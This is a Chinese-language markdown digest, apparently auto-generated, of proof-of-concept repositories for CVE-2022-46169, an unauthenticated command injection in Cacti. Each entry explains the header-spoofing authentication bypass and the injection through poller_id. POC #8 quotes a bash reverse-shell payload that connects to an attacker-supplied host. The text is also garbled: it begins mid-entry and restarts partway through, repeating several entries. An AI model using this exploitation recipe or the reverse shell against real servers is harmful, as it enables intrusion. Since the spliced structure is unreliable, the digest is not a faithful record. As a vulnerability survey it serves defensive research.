4.  **利用条件：** 成功利用需要存在一个 `poller_item`，其 `action` 字段值为 `POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id` 和 `local_data_ids` 可以通过暴力破解找到。

提供的POC代码 (`CVE-2022-46169.py`) 实现了上述攻击过程，包含以下步骤：

*   检查目标是否易受攻击 (`checkVuln` 函数)。
*   通过暴力破解查找有效的 `host_id` 和 `local_data_ids` (`bruteForcing` 函数)。
*   构造包含反向shell payload 的恶意请求，并将其发送到 `remote_agent.php` (`Reverse_shell` 函数)。

**关于投毒风险：**

对提供的POC代码进行分析，并未发现明显的恶意投毒代码，例如删除文件、上传恶意文件等行为。POC代码的主要功能是利用漏洞进行反向Shell连接。但依然存在一定的潜在风险：

*   **依赖风险：** 虽然代码本身看起来没有恶意，但它依赖于 `requests` 和 `urllib` 库。如果这些库本身被篡改，可能会引入风险。
*   **命令执行风险：**  该漏洞本身允许执行任意命令，攻击者可以利用这一点执行恶意操作。但这不属于代码投毒，而是漏洞的 inherent risk。

因此，将投毒风险评估为 5%。

**项目地址:** [FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #5

**来源**: [CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md](../2022/CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权远程代码执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标Cacti实例必须存在action类型为POLLER_ACTION_SCRIPT_PHP (2)的 poller_item配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的远程代码执行漏洞。该漏洞利用链包括身份验证绕过和命令注入两部分。

**利用方式：**

1.  **身份验证绕过：**  攻击者通过构造包含`Forwarded-For: <TARGETIP>`头的HTTP请求，其中`<TARGETIP>`为Cacti服务器的IP地址。`get_client_addr()` 函数会读取 `Forwarded-For` 头部，导致服务器错误地将攻击者识别为自身。因为Cacti默认会在poller表中添加自身hostname, 因此导致认证绕过。
2.  **命令注入：**  绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。该动作调用 `poll_for_data` 函数，该函数从请求参数中获取 `$poller_id`，此参数未经过滤直接拼接到 `proc_open` 函数的参数中，导致命令注入。攻击者需要提供一个`host_id`和`local_data_id`，并且对应poller_item的action必须是`POLLER_ACTION_SCRIPT_PHP`(值为2)才能触发命令注入.

**有效性：**

提供的POC代码（docker-compose.yaml）用于搭建存在漏洞的Cacti环境，方便漏洞分析和复现。漏洞原理描述清晰，利用方式明确。综合漏洞描述和搜索引擎结果，该漏洞利用的有效性高。

**投毒风险：**

虽然POC的主要目的是演示和分析漏洞，但存在一定的投毒风险。docker-compose.yaml 文件中使用了镜像 `smcline06/cacti`，如果该镜像被篡改，可能包含恶意代码。此外，提供的教程包含大量图片链接，这些链接如果指向恶意网站，也可能存在风险。综合考虑，评估投毒风险为10%。

**项目地址:** [HPT-Intern-Task-Submission/CVE-2022-46169](https://github.com/HPT-Intern-Task-Submission/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #6

**来源**: [CVE-2022-46169-Habib0x0_CVE-2022-46169.md](../2022/CVE-2022-46169-Habib0x0_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在满足条件的 poller_item (POLLER_ACTION_SCRIPT_PHP 类型), 且攻击者能够访问 remote_agent.php 页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并利用 `poller_id` 参数进行命令注入。 

**利用方式：**

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header，伪造客户端IP，绕过 `remote_agent.php` 的身份验证。
2.  **参数污染:** 攻击者利用`poller_id`，`host_id`，`local_data_ids[]`参数进行参数污染。
3.  **命令注入：** 成功绕过身份验证后，攻击者可以利用 `polldata` action，将恶意命令注入到 `poller_id` 参数中，从而执行任意系统命令。

**POC 分析：**

提供的 Ruby POC 代码首先尝试绕过身份验证，然后爆破`host_id`和`local_data_ids[]`，以找到有效的 `poller_item`，最后构造包含恶意命令的 URL，并发送 HTTP 请求触发命令注入。

**投毒风险分析：**

该 POC 代码主要功能是利用漏洞进行攻击。投毒风险较低，但仍然存在一定的潜在风险。
*   **依赖项风险：** POC 代码依赖于 `net/http`、`uri`、`json`、`optparse`、`artii` 和 `colorize` 等 Ruby 库。虽然这些库本身不太可能包含恶意代码，但始终存在依赖项被污染的风险。
*   **恶意命令注入：** 虽然 POC 中显示的命令是发起反向 Shell，但攻击者可以修改 POC 代码，注入其他恶意命令，例如删除文件、篡改数据等。因此，在使用 POC 时，务必仔细审查代码，确保不会执行未授权的操作。

综上，该 POC 的投毒风险相对较低，但仍需谨慎使用，并对代码进行充分审查。

**项目地址:** [Habib0x0/CVE-2022-46169](https://github.com/Habib0x0/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #7

**来源**: [CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md](../2022/CVE-2022-46169-JacobEbben_CVE-2022-46169_unauth_remote_code_execution.md)

# CVE-2022-46169

> 📦 该CVE有 **30** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-46169-0xN7y_CVE-2022-46169.md](../2022/CVE-2022-46169-0xN7y_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例的URL，以及目标Cacti实例存在至少一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头`X-Forwarded-For`绕过身份验证，然后利用`polldata`动作触发命令注入。漏洞存在于`remote_agent.php`文件中，攻击者通过伪造客户端IP绕过认证，进而利用`poller_id`参数执行任意命令。提供的Python POC代码通过尝试不同的`host_id`和`poller_id`值，发送包含反向shell命令的恶意请求。 

**有效性：**
根据漏洞描述和POC代码，该漏洞利用是有效的，因为它可以允许未经身份验证的攻击者在受影响的Cacti实例上执行任意命令。

**投毒风险：**
该POC代码的投毒风险较低，约为5%。代码主要实现了漏洞利用，没有发现明显的恶意行为，如删除文件、上传恶意文件等。但是，任何漏洞利用代码都可能被修改为包含恶意功能，因此在使用前仍需谨慎审查。以下为可能的投毒点:

*   **反向shell地址：** 攻击者可能在不知情的情况下使用了被污染的反向shell监听地址，导致攻击暴露。
*   **命令注入payload：** 虽然当前payload是反向shell，但攻击者可能在不知情的情况下运行了其他有害命令。

**利用方式：**
1.  **身份验证绕过：** 通过设置`X-Forwarded-For` HTTP头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入：** 访问`remote_agent.php`，并设置`action`参数为`polldata`，`poller_id`参数为恶意命令。需要结合有效的`host_id`和`local_data_ids[]`，使得对应的`poller_item`的`action`为`POLLER_ACTION_SCRIPT_PHP`。
3.  **命令执行：** Cacti执行`proc_open`函数，将构造的恶意命令注入到shell中，实现远程代码执行。

**项目地址:** [0xN7y/CVE-2022-46169](https://github.com/0xN7y/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #2

**来源**: [CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md](../2022/CVE-2022-46169-0xZon_CVE-2022-46169-Exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`，且攻击者能够访问`remote_agent.php`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞，未经身份验证的攻击者可以通过精心构造的请求执行任意OS命令。该漏洞存在于`remote_agent.php`文件中，通过伪造 `X-Forwarded-For` 头绕过身份验证，然后通过 `polldata` 操作注入命令。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被积极利用。提供的PoC代码利用了身份验证绕过和命令注入漏洞，通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`，如果找到则执行反弹 shell 命令。  PoC的有效性较高。

**投毒风险：**
查看提供的PoC代码（`CVE-2022-46169.py`和`LICENSE`），主要功能是利用漏洞，没有发现明显的恶意代码或后门。`LICENSE` 文件是 GNU GPL v3 许可协议，属于开源协议。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 头部来伪造客户端IP地址，绕过 `remote_agent.php` 文件的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `polldata` 操作，并通过 `poller_id` 参数注入恶意命令。  PoC利用bash反弹shell。
3.  **参数爆破：** PoC代码通过爆破 `host_id` 和 `local_data_ids` 来查找具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。
4.  **执行任意命令：** 成功注入命令后，服务器将执行攻击者提供的命令。

**项目地址:** [0xZon/CVE-2022-46169-Exploit](https://github.com/0xZon/CVE-2022-46169-Exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #3

**来源**: [CVE-2022-46169-BKreisel_CVE-2022-46169.md](../2022/CVE-2022-46169-BKreisel_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** <= 1.2.22

**利用条件:** 需要Cacti服务器可访问，且存在action类型为POLLER_ACTION_SCRIPT_PHP（2）的poller_item配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.22 及更早版本中，是一个未经身份验证的远程命令注入漏洞。攻击者可以通过伪造HTTP头绕过身份验证，然后通过操纵`poller_id`参数在`remote_agent.php`文件中执行任意命令。PoC代码通过Python脚本实现，利用此漏洞获取反向shell。该仓库的主要功能是提供漏洞利用代码，但由于开源软件的性质，任何人都可能修改并重新发布。**投毒风险较低 (5%)**，主要是因为该项目结构简单、代码量小，且功能单一，主要代码集中在cve_2022_46169/main.py中。需要人工审核确认没有恶意代码被隐藏。尽管存在风险，但考虑到代码的直接性和漏洞利用的明确性，以及利用反向shell的常见性，可以判断该代码的投毒可能性较低。

**利用方式：**
1.  攻击者首先需要确定目标Cacti服务器的版本低于或等于1.2.22。
2.  攻击者发送特制的HTTP请求到`remote_agent.php`，包含伪造的`Forwarded-For`头，绕过身份验证。
3.  攻击者构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，触发命令注入。
4.  如果目标服务器存在`POLLER_ACTION_SCRIPT_PHP`类型的`poller_item`配置，攻击者的命令将被执行。
5.  PoC代码利用此漏洞创建一个反向shell，允许攻击者远程控制目标服务器。

**项目地址:** [BKreisel/CVE-2022-46169](https://github.com/BKreisel/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #4

**来源**: [CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md](../2022/CVE-2022-46169-FredBrave_CVE-2022-46169-CACTI-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23且存在action类型为POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `remote_agent.php` 文件中的请求参数来执行任意操作系统命令。漏洞利用涉及以下步骤：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header 欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址，从而绕过身份验证检查。
2.  **`polldata` 操作触发：**  身份验证绕过后，攻击者可以调用 `remote_agent.php` 中的 `polldata` 操作。
3.  **命令注入：** 通过构造恶意的 `poller_id` 参数，将命令注入到传递给 `proc_open` 函数的字符串中，从而执行任意命令。
4.  **利用条件：** 成功利用需要存在一个 `poller_item`，其 `action` 字段值为 `POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id` 和 `local_data_ids` 可以通过暴力破解找到。

提供的POC代码 (`CVE-2022-46169.py`) 实现了上述攻击过程，包含以下步骤：

*   检查目标是否易受攻击 (`checkVuln` 函数)。
*   通过暴力破解查找有效的 `host_id` 和 `local_data_ids` (`bruteForcing` 函数)。
*   构造包含反向shell payload 的恶意请求，并将其发送到 `remote_agent.php` (`Reverse_shell` 函数)。

**关于投毒风险：**

对提供的POC代码进行分析，并未发现明显的恶意投毒代码，例如删除文件、上传恶意文件等行为。POC代码的主要功能是利用漏洞进行反向Shell连接。但依然存在一定的潜在风险：

*   **依赖风险：** 虽然代码本身看起来没有恶意，但它依赖于 `requests` 和 `urllib` 库。如果这些库本身被篡改，可能会引入风险。
*   **命令执行风险：**  该漏洞本身允许执行任意命令，攻击者可以利用这一点执行恶意操作。但这不属于代码投毒，而是漏洞的 inherent risk。

因此，将投毒风险评估为 5%。

**项目地址:** [FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #5

**来源**: [CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md](../2022/CVE-2022-46169-HPT-Intern-Task-Submission_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权远程代码执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标Cacti实例必须存在action类型为POLLER_ACTION_SCRIPT_PHP (2)的 poller_item配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中存在的一个未经身份验证的远程代码执行漏洞。该漏洞利用链包括身份验证绕过和命令注入两部分。

**利用方式：**

1.  **身份验证绕过：**  攻击者通过构造包含`Forwarded-For: <TARGETIP>`头的HTTP请求，其中`<TARGETIP>`为Cacti服务器的IP地址。`get_client_addr()` 函数会读取 `Forwarded-For` 头部，导致服务器错误地将攻击者识别为自身。因为Cacti默认会在poller表中添加自身hostname, 因此导致认证绕过。
2.  **命令注入：**  绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。该动作调用 `poll_for_data` 函数，该函数从请求参数中获取 `$poller_id`，此参数未经过滤直接拼接到 `proc_open` 函数的参数中，导致命令注入。攻击者需要提供一个`host_id`和`local_data_id`，并且对应poller_item的action必须是`POLLER_ACTION_SCRIPT_PHP`(值为2)才能触发命令注入.

**有效性：**

提供的POC代码（docker-compose.yaml）用于搭建存在漏洞的Cacti环境，方便漏洞分析和复现。漏洞原理描述清晰，利用方式明确。综合漏洞描述和搜索引擎结果，该漏洞利用的有效性高。

**投毒风险：**

虽然POC的主要目的是演示和分析漏洞，但存在一定的投毒风险。docker-compose.yaml 文件中使用了镜像 `smcline06/cacti`，如果该镜像被篡改，可能包含恶意代码。此外，提供的教程包含大量图片链接，这些链接如果指向恶意网站，也可能存在风险。综合考虑，评估投毒风险为10%。

**项目地址:** [HPT-Intern-Task-Submission/CVE-2022-46169](https://github.com/HPT-Intern-Task-Submission/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #6

**来源**: [CVE-2022-46169-Habib0x0_CVE-2022-46169.md](../2022/CVE-2022-46169-Habib0x0_CVE-2022-46169.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在满足条件的 poller_item (POLLER_ACTION_SCRIPT_PHP 类型), 且攻击者能够访问 remote_agent.php 页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并利用 `poller_id` 参数进行命令注入。 

**利用方式：**

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP Header，伪造客户端IP，绕过 `remote_agent.php` 的身份验证。
2.  **参数污染:** 攻击者利用`poller_id`，`host_id`，`local_data_ids[]`参数进行参数污染。
3.  **命令注入：** 成功绕过身份验证后，攻击者可以利用 `polldata` action，将恶意命令注入到 `poller_id` 参数中，从而执行任意系统命令。

**POC 分析：**

提供的 Ruby POC 代码首先尝试绕过身份验证，然后爆破`host_id`和`local_data_ids[]`，以找到有效的 `poller_item`，最后构造包含恶意命令的 URL，并发送 HTTP 请求触发命令注入。

**投毒风险分析：**

该 POC 代码主要功能是利用漏洞进行攻击。投毒风险较低，但仍然存在一定的潜在风险。
*   **依赖项风险：** POC 代码依赖于 `net/http`、`uri`、`json`、`optparse`、`artii` 和 `colorize` 等 Ruby 库。虽然这些库本身不太可能包含恶意代码，但始终存在依赖项被污染的风险。
*   **恶意命令注入：** 虽然 POC 中显示的命令是发起反向 Shell，但攻击者可以修改 POC 代码，注入其他恶意命令，例如删除文件、篡改数据等。因此，在使用 POC 时，务必仔细审查代码，确保不会执行未授权的操作。

综上，该 POC 的投毒风险相对较低，但仍需谨慎使用，并对代码进行充分审查。

**项目地址:** [Habib0x0/CVE-2022-46169](https://github.com/Habib0x0/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #7

**来源**: [CVE-2022-46169-MarkStrendin_CVE-2022-46169.md](../2022/CVE-2022-46169-MarkStrendin_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** Cacti服务器运行，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item，需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求绕过身份验证，并利用 `remote_agent.php` 文件中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者可以通过设置 `X-Forwarded-For` 或其他 `HTTP_` 开头的 HTTP Header，伪造客户端IP地址，使其与Cacti服务器自身的IP地址相同。`get_client_addr` 函数会读取这些header，然后 `gethostbyaddr` 函数将伪造的IP解析为主机名。由于 Cacti 的 `poller` 表中默认存在服务器自身的主机名记录，因此绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 参数的请求，并指定 `host_id`、`local_data_ids[]` 和 `poller_id`。其中，`poller_id` 参数没有经过充分的过滤，攻击者可以在 `poller_id` 中注入恶意命令。
3.  **寻找合适的poller_item：** 为了触发命令注入，需要存在一个 `poller_item`，其 `action` 字段的值为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，用于利用 CVE-2022-46169 漏洞。该脚本首先检查目标是否易受攻击，然后暴力破解 `host_id` 和 `local_data_id`，以便找到具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。 一旦找到，它会构造一个包含恶意负载的 HTTP 请求并发送到 `remote_agent.php`。

**投毒风险分析：**

该代码主要目的是发送payload以获得反向shell，并没有发现恶意修改或删除文件等高危操作。代码的功能基本符合描述，但仍然存在一些潜在风险。

*   **依赖风险：** 代码依赖 `requests` 库，如果 `requests` 库被恶意篡改，可能会导致安全问题。
*   **配置错误：** 攻击者可能会错误配置 `attacker_ip` 和 `attacker_port`，导致攻击失败或暴露自己的IP地址。

根据以上分析，该POC存在较低的投毒风险。 代码的主要功能是利用已知漏洞，没有发现额外的恶意代码或隐藏功能，但也不能完全排除攻击者在实际使用中进行修改以达到其他目的的可能性。 风险评估较低，约为5%。

**结论：**

该漏洞的利用较为直接，POC代码有效。 漏洞存在投毒风险，但风险较低。

**项目地址:** [MarkStrendin/CVE-2022-46169](https://github.com/MarkStrendin/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #8

**来源**: [CVE-2022-46169-N1arut_CVE-2022-46169_POC.md](../2022/CVE-2022-46169-N1arut_CVE-2022-46169_POC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在`POLLER_ACTION_SCRIPT_PHP`类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 HTTP 头 `X-Forwarded-For` 绕过身份验证，并利用 `remote_agent.php` 脚本中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过:** 通过设置 `X-Forwarded-For` 头为 Cacti 服务器的 IP 地址，欺骗 `get_client_addr` 函数，绕过身份验证。
2.  **查找可利用的 poller_item:**  通过暴力破解 `host_id` 和 `local_data_id`，找到 `action` 为 `POLLER_ACTION_SCRIPT_PHP` (值为 2)的 `poller_item`。
3.  **命令注入:** 将恶意命令注入到 `poller_id` 参数中，通过 `proc_open` 函数执行。

**POC代码分析：**

*   `cacti_exploit.py` 脚本自动化了漏洞利用过程。
*   首先尝试访问 `/remote_agent.php?action=polldata` 或 `/cacti/remote_agent.php?action=polldata` 来确定正确的URL。
*   然后，脚本使用 `X-Forwarded-For` 头绕过身份验证。
*   接下来，脚本暴力破解 `host_id` 和 `local_data_ids` 来寻找合适的 `poller_item`。
*   最后，脚本构造包含反向 shell 命令的 URL，并发送请求来利用命令注入漏洞。

**有效性：**

根据漏洞描述、搜索结果以及提供的 POC 代码，此漏洞是有效的。搜索结果表明该漏洞已被积极利用。

**投毒风险：**

虽然该脚本的主要目的是利用 CVE-2022-46169 漏洞，但存在轻微的投毒风险。具体体现在：

*   **硬编码参数:** 脚本中存在一些硬编码的参数，例如 `poller_id=1`，`host_id=1`，`local_data_ids[]=1`, `words = ["cpu","cmd.php","polling_time","apache"]`。这些值在不同的 Cacti 部署中可能不同，如果用户不加修改直接使用，可能导致利用失败。这可以被视为一种隐蔽的“陷阱”，虽然不是恶意的后门，但也可能误导用户。
*   **反向Shell Payload:** 用户如果直接使用payload `sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`需要确保目标机器上存在sh.如果没有可能需要更换payload.如果不熟悉的用户可能利用失败.
*   **依赖第三方库:** 脚本依赖 `requests` 和 `urllib3` 库。如果用户从不可信的源安装这些库，可能会引入恶意代码。

尽管如此，该脚本没有发现明显的恶意代码（如删除文件、上传恶意文件等），因此投毒的概率较低，约为5%。主要风险在于使用不当或未能正确配置脚本导致利用失败。


**项目地址:** [N1arut/CVE-2022-46169_POC](https://github.com/N1arut/CVE-2022-46169_POC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #9

**来源**: [CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md](../2022/CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵`remote_agent.php`文件中的输入，利用`poller_id`参数执行任意操作系统命令。攻击流程如下：

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`头绕过身份验证。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，允许攻击者伪造客户端IP地址，从而通过`poller`表中的主机名检查。
2.  **触发命令注入：** 绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。`poll_for_data`函数检索请求参数并加载相应的`poller_item`条目。如果`poller_item`的`action`等于`POLLER_ACTION_SCRIPT_PHP`，则使用`proc_open`执行PHP脚本。`poller_id`参数在传递给`proc_open`之前未经过充分过滤，从而导致命令注入。
3.  **漏洞利用代码分析：**  `poc.sh` 脚本首先解析用户提供的参数（目标URL、本地IP和端口），然后构造反向shell的payload，并对其进行URL编码。脚本通过发送带有`X-Forwarded-For`头的HTTP请求来检查目标是否易受攻击。该脚本通过暴力破解`host_id`和`local_data_ids`来枚举有效的URL。最后，它使用构造的payload向目标发送一个请求，从而触发反向shell。
4.  **投毒风险评估：**  该POC的主要目的是利用漏洞实现反向Shell。检查`poc.sh`脚本，发现脚本本身主要功能是生成Payload、URL编码、发送HTTP请求。虽然存在修改反向连接IP和端口的可能性，但没有发现明显的恶意代码或后门。`README.md`中建议访问的GitHub仓库 (`https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application`)，用于搭建漏洞环境，**存在一定风险，应该注意**。总体而言，脚本投毒风险较低，初步评估为5%。风险主要来自于下载其他来源的poc，或者使用poc访问陌生的网址。
5.  **有效性评估:** 该POC的有效性较高，因为它可以自动化漏洞利用过程，从身份验证绕过到命令执行。多个搜索引擎结果表明该漏洞已被积极利用。
6.  **利用方式总结：** 通过伪造HTTP头绕过身份验证，然后利用未过滤的`poller_id`参数在`remote_agent.php`中注入命令，最终实现远程代码执行。

**项目地址:** [RdBBB3/SHELL-POC-CVE-2022-46169](https://github.com/RdBBB3/SHELL-POC-CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #10

**来源**: [CVE-2022-46169-Rickster5555_EH2-PoC.md](../2022/CVE-2022-46169-Rickster5555_EH2-PoC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响版本的Cacti，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中存在的一个命令注入漏洞，允许未经身份验证的攻击者在服务器上执行任意命令。漏洞存在于`remote_agent.php`文件中，由于对客户端IP地址的验证不严谨，攻击者可以通过设置`X-Forwarded-For`等HTTP头部绕过身份验证。绕过验证后，可以调用`polldata`动作，并利用`poller_id`参数的命令注入漏洞执行系统命令。

**利用方式：**

1.  攻击者发送带有恶意`X-Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含命令注入的`poller_id`参数的HTTP请求，发送到`remote_agent.php`，执行任意系统命令。 为了成功利用，必须存在一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP`（值为2）。

**POC有效性：**

提供的PoC代码通过发送带有特定HTTP头部的GET请求，利用`poller_id`参数执行命令注入。根据漏洞描述和PoC代码，该PoC是有效的，可以用于验证漏洞的存在。

**投毒风险：**

查看提供的文件，包括`README.md`、`cacti-CI-poc.py`、`docker-compose.yml`和`entrypoint.sh`。

*   `README.md`：包含漏洞描述、复现步骤和参考链接，没有发现恶意代码。
*   `cacti-CI-poc.py`：PoC脚本，用于发送HTTP请求触发命令注入，没有发现恶意代码，但利用时执行的命令完全由使用者控制，具有潜在风险。
*   `docker-compose.yml`：Docker Compose配置文件，用于构建包含漏洞版本的Cacti环境，没有发现恶意配置。
